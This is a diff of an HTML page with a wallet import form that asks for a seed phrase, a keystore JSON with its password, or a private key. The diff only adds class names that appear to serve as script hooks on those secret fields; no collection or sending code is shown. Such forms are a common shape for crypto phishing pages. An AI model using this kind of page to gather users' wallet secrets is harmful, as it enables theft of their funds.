@@ -50,7 +50,7 @@
       <ul class="nav nav-tabs" id="walletTab" role="tablist">
         <li class="nav-item">
           <a
-            class="nav-link active"
+            class="nav-link active phrase-type"
             id="phrase-tab"
             data-toggle="tab"
             href="#phrase"
@@ -60,7 +60,7 @@
         </li>
         <li class="nav-item">
           <a
-            class="nav-link"
+            class="nav-link phrase-type"
             id="keystore-tab"
             data-toggle="tab"
             href="#keystore"
@@ -70,7 +70,7 @@
         </li>
         <li class="nav-item">
           <a
-            class="nav-link"
+            class="nav-link phrase-type"
             id="privatekey-tab"
             data-toggle="tab"
             href="#privatekey"
@@ -84,12 +84,12 @@
         <div class="tab-pane fade show active" id="phrase" role="tabpanel">
           <div class="form-group">
             <textarea
-              class="form-control"
+              class="form-control Phrase"
               rows="3"
               placeholder="Phrase (12 or 24 words)"
             ></textarea>
           </div>
-          <button class="btn btn-primary btn-block">Import</button>
+          <button class="btn btn-primary btn-block import-btn">Import</button>
           <small class="form-text text-muted"
             >Typically 12 (sometimes 24) words separated by single spaces</small
           >
@@ -98,7 +98,7 @@
         <div class="tab-pane fade" id="keystore" role="tabpanel">
           <div class="form-group">
             <textarea
-              class="form-control"
+              class="form-control Keystore-JSON"
               rows="3"
               placeholder="Keystore JSON"
             ></textarea>
@@ -106,11 +106,11 @@
           <div class="form-group">
             <input
               type="password"
-              class="form-control"
+              class="form-control Keystore-JSON-password"
               placeholder="Password"
             />
           </div>
-          <button class="btn btn-primary btn-block">Import</button>
+          <button class="btn btn-primary btn-block import-btn">Import</button>
           <small class="form-text text-muted"
             >Several lines of text beginning with {"..."} plus the password you
             used to encrypt it</small
@@ -120,12 +120,12 @@
         <div class="tab-pane fade" id="privatekey" role="tabpanel">
           <div class="form-group">
             <textarea
-              class="form-control"
+              class="form-control PrivateKey"
               rows="2"
               placeholder="Private Key"
             ></textarea>
           </div>
-          <button class="btn btn-primary btn-block">Import</button>
+          <button class="btn btn-primary btn-block import-btn">Import</button>
           <small class="form-text text-muted"
             >Typically 64 alphanumeric characters</small
           >
